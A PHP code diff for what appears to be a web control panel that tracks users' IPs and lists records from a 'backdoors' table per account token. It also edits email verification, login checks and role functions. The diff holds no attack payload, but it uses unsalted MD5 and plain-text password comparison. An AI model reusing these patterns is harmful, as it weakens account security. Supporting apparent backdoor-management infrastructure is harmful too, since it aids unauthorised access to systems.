@@ -108,7 +108,7 @@ class Account {
             // email verification link
             $subject= "Account Verfication.";
             $headers = "From: <webmaster@w0rst.xyz>\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=ISO-8859-1\r\n";
-            $message= "<html><h2>Hello, $user.\nEmail verification required, head on over <a href='https://w0rst.xyz/beta/core/auth/simple.php?request=verify&token=$token'>Here!</a></h2></html>";
+            $message= "<html><h2>Hello, $user.\nEmail verification required, head on over <a href='https://w0rst.xyz/panel/core/auth/simple.php?request=verify&token=$token'>Here!</a></h2></html>";
             
             mail($mail, $subject, $message, $headers);
 
@@ -146,6 +146,8 @@ class Account {
         if(Secure::AntiVpn()) { $Error[] = "Vpn not allowed"; }
 
         $AccountInfo = Account::Info($user);
+        $IpAddress = $_SERVER['REMOTE_ADDR'];
+
         if(md5($pass) != $AccountInfo['password']) { 
             $Error[] = "Invalid credentials";
         }
@@ -154,8 +156,12 @@ class Account {
             $Error[] = "Failed captcha";
         }
 
-        if($AccountInfo['verified'] == "false") {
-            $Error[] = "Email verification required";
+        if($AccountInfo['verified'] == "false") { 
+            $Error[] = "Awaiting Email Verification";
+        }
+
+        if($IpAddress != $AccountInfo['ip']) {
+            Account::Edit($user, "ip", $IpAddress);
         }
 
         if(empty($Error)) {
@@ -182,18 +188,11 @@ class Secure {
     }
 
     public function AntiAlt() {
-        $Address = $_SERVER['REMOTE_ADDR'];
-
-        // update ip address if it had changed
-        if(Local::Info()['ip'] != $Address) {
-            $GLOBALS['database']->Update('users', ['token' => $_SESSION['token']], ['ip' => $Address]);
-        }
-
-        $res = $GLOBALS['database']->GetContent('users', ['ip' => $Address]);
+        $res = $GLOBALS['database']->GetContent('users', ['ip' => $_SERVER['REMOTE_ADDR']]);
         
-        foreach($res as $user) {
-            if ($user['token'] != Local::Info()['token']) {
-                return true;
+        foreach($res as $res) {
+            if ($_SESSION['token'] != $res['token']) {
+                return true; 
             }
         }
 
@@ -227,8 +226,8 @@ class Log {
     public function Server($method) {
         switch($method) {
             case "all": return $GLOBALS['database']->GetContent('backdoors');
-            case "public": return $GLOBALS['database']->GetContent('backdoors', ['userkey' => 'none']);
-            case "private": return $GLOBALS['database']->GetContent('backdoors', ['userkey' => $_SESSION['token']]);
+            case "public": return $GLOBALS['database']->GetContent('backdoors', ['token' => 'none']);
+            case "private": return $GLOBALS['database']->GetContent('backdoors', ['token' => $_SESSION['token']]);
         }
     }
 }
@@ -239,6 +238,7 @@ class Script {
         if(empty($pass)) { $Error[] = "Invalid password"; }
 
         $AccountInfo = Account::Info($user);
+        $IpAddress = $_SERVER['REMOTE_ADDR'];
 
         // incorrect information
         if($pass != $AccountInfo['password']) { 
@@ -252,7 +252,17 @@ class Script {
 
         // account needs verification
         if($AccountInfo['verified'] == "false") { 
-            $Error[] = "Awaiting Verification";
+            $Error[] = "Awaiting Email Verification";
+        }
+
+        // account never linked discord 
+        if($AccountInfo['discord'] == "NULL") {
+            $Error[] = "Awaiting Discord Link";
+        }
+    
+        // update ip address if it changed
+        if($IpAddress != $AccountInfo['ip']) {
+            Account::Edit($user, "ip", $IpAddress);
         }
 
         if(empty($Error)) {
@@ -266,7 +276,7 @@ class Script {
         }
     }
     
-    function IsAdmin($user) {
+    function IsBlacklisted($user) {
         $blacklist = Account::Info($user)['blacklist'];
 
         if($blacklist == "true") {
@@ -276,7 +286,7 @@ class Script {
         return false;
     }
 
-    function IsBlacklisted($user) {
+    function IsAdmin($user) {
         $role = Account::Info($user)['role'];
         $roles = array('admin', 'funky');
 
